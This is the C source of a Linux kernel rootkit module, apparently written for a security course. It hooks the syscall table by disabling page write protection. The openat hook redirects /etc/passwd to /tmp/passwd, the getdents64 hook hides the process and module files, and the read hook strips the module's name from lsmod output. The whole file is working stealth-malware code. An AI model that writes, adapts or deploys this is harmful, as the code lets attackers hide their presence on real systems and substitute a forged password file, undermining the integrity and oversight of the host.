// #include <linux/module.h> // for all modules
// #include <linux/init.h>   // for entry/exit macros
// #include <linux/kernel.h> // for printk and other kernel bits
// #include <asm/current.h>  // process information
// #include <linux/sched.h>
// #include <linux/highmem.h> // for changing page permissions
// #include <asm/unistd.h>    // for system call constants
// #include <linux/kallsyms.h>
// #include <asm/page.h>
// #include <asm/cacheflush.h>
// #include <linux/slab.h>
#include <linux/module.h>
#include <linux/init.h>
#include <linux/kernel.h>
#include <asm/current.h>
#include <linux/sched.h>
#include <linux/highmem.h>
#include <asm/unistd.h>
#include <linux/kallsyms.h>
#include <asm/page.h>
#include <asm/cacheflush.h>
#include <linux/fs.h>
#include <linux/uaccess.h>
#include <linux/slab.h>
#include <linux/proc_fs.h>
#include <linux/limits.h>
#include <linux/dirent.h>

#define PREFIX "sneaky_process"

// Define the sneaky_process pid
static int pid = 0;
module_param(pid, int, 0);

// This is a pointer to the system call table
static unsigned long *sys_call_table;

// Helper functions, turn on and off the PTE address protection mode
// for syscall_table pointer
int enable_page_rw(void *ptr)
{
  unsigned int level;
  pte_t *pte = lookup_address((unsigned long)ptr, &level);
  if (pte->pte & ~_PAGE_RW)
  {
    pte->pte |= _PAGE_RW;
  }
  return 0;
}

int disable_page_rw(void *ptr)
{
  unsigned int level;
  pte_t *pte = lookup_address((unsigned long)ptr, &level);
  pte->pte = pte->pte & ~_PAGE_RW;
  return 0;
}

// 1. Function pointer will be used to save address of the original 'openat' syscall.
// 2. The asmlinkage keyword is a GCC #define that indicates this function
//    should expect it find its arguments on the stack (not in registers).
asmlinkage int (*original_openat)(struct pt_regs *);

asmlinkage int sneaky_sys_openat(struct pt_regs *regs)
{
  char *file_path = (char *)(regs->si);

  if (strncmp(file_path, "/etc/passwd", 12) == 0)
  {
    const char *tmpPath = "/tmp/passwd";
    size_t tmp_path_len = strlen(tmpPath) + 1;

    if (copy_to_user(file_path, tmpPath, tmp_path_len) != 0)
    {
      printk(KERN_WARNING "Sneaky kernel module: failed to copy the temporary password file to user.\n");
      return -EFAULT;
    }
  }

  return (*original_openat)(regs);
}

asmlinkage int (*original_getdents64)(struct pt_regs *);

asmlinkage int fake_getdents64(struct pt_regs *regs)
{
  int res;
  struct linux_dirent64 *dirp, *cur_dirp;
  long bytes_len;
  char *next_dirp;

  res = (*original_getdents64)(regs);
  if (res <= 0)
  {
    return res;
  }
  dirp = (struct linux_dirent64 *)regs->si;
  bytes_len = res;

  while (bytes_len > 0)
  {
    cur_dirp = dirp;
    next_dirp = (char *)dirp + dirp->d_reclen;
    bytes_len -= dirp->d_reclen;
    // Check if the d_name should be hidden
    if (strcmp("sneaky_process", cur_dirp->d_name) == 0 || strcmp("sneaky_mod", cur_dirp->d_name) == 0 || (pid != -1 && strcmp(cur_dirp->d_name, "sneakyuser") == 0))
    {
      memmove(cur_dirp, next_dirp, bytes_len);
      res -= cur_dirp->d_reclen;
      continue;
    }
    dirp = (struct linux_dirent64 *)next_dirp;
  }
  return res;
}

asmlinkage ssize_t (*original_read)(struct pt_regs *);

asmlinkage ssize_t fake_read(struct pt_regs *regs)
{
  ssize_t res_proc;
  char *buffer, *read_start;
  res_proc = (*original_read)(regs);

  if (res_proc <= 0)
  {
    return res_proc;
  }

  // Check if reading /proc/modules
  if (strcmp(current->comm, "lsmod") == 0)
  {
    buffer = (char *)regs->si;
    read_start = strstr(buffer, "sneaky_mod");
    if (read_start != NULL)
    {
      char *read_end = strchr(read_start, '\n');
      if (read_end != NULL)
      {
        read_end++;
        memmove(read_start, read_end, (buffer + res_proc) - read_end);
        res_proc -= (read_end - read_start);
      }
    }
  }
  return res_proc;
}

asmlinkage ssize_t sneaky_sys_read(struct pt_regs *regs)
{
  ssize_t bytesRead = (*original_read)(regs);

  if (bytesRead > 0)
  {
    void *posStart = strnstr((char *)(regs->si), "sneaky_mod", bytesRead);
    if (posStart != NULL)
    {
      void *posEnd = strnstr(posStart, "\n", bytesRead - (posStart - (void *)(regs->si)));
      if (posEnd != NULL)
      {
        int size = posEnd - posStart + 1;
        memmove(posStart, posEnd + 1, bytesRead - (posStart - (void *)(regs->si)) - size);
        bytesRead -= size;
      }
    }
  }
  return bytesRead;
}

// The code that gets executed when the module is loaded
static int initialize_sneaky_module(void)
{
  // See /var/log/syslog or use `dmesg` for kernel print output
  printk(KERN_INFO "Sneaky module being loaded.\n");

  // Lookup the address for this symbol. Returns 0 if not found.
  // This address will change after rebooting due to protection
  sys_call_table = (unsigned long *)kallsyms_lookup_name("sys_call_table");

  // This is the magic! Save away the original 'openat' system call
  // function address. Then overwrite its address in the system call
  // table with the function address of our new code.
  original_openat = (void *)sys_call_table[__NR_openat];
  original_getdents64 = (void *)sys_call_table[__NR_getdents64];
  original_read = (void *)sys_call_table[__NR_read];

  // Turn off write protection mode for sys_call_table
  enable_page_rw((void *)sys_call_table);

  sys_call_table[__NR_openat] = (unsigned long)sneaky_sys_openat;
  sys_call_table[__NR_getdents64] = (unsigned long)fake_getdents64;
  // sys_call_table[__NR_read] = (unsigned long)fake_read;
  sys_call_table[__NR_read] = (unsigned long)sneaky_sys_read;

  // You need to replace other system calls you need to hack here

  // Turn write protection mode back on for sys_call_table
  disable_page_rw((void *)sys_call_table);

  return 0; // to show a successful load
}

static void exit_sneaky_module(void)
{
  printk(KERN_INFO "Sneaky module being unloaded.\n");

  // Turn off write protection mode for sys_call_table
  enable_page_rw((void *)sys_call_table);

  // This is more magic! Restore the original 'open' system call
  // function address. Will look like malicious code was never there!
  sys_call_table[__NR_openat] = (unsigned long)original_openat;
  sys_call_table[__NR_getdents64] = (unsigned long)original_getdents64;
  sys_call_table[__NR_read] = (unsigned long)original_read;

  // Turn write protection mode back on for sys_call_table
  disable_page_rw((void *)sys_call_table);
}

module_init(initialize_sneaky_module); // what's called upon loading
module_exit(exit_sneaky_module);       // what's called upon unloading
MODULE_LICENSE("GPL");